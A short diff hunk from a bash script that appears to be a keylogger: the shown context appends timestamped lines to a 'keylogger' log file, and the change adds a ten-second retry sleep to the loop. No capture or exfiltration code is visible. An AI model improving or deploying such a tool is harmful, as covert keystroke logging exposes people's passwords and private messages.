@@ -56,4 +56,5 @@ while true; do
     fi
     echo "$(date +%s%3N) $line" >> "${path}/keylogger${date}.key"
   done
+  sleep 10 # retry after 10 seconds
 done
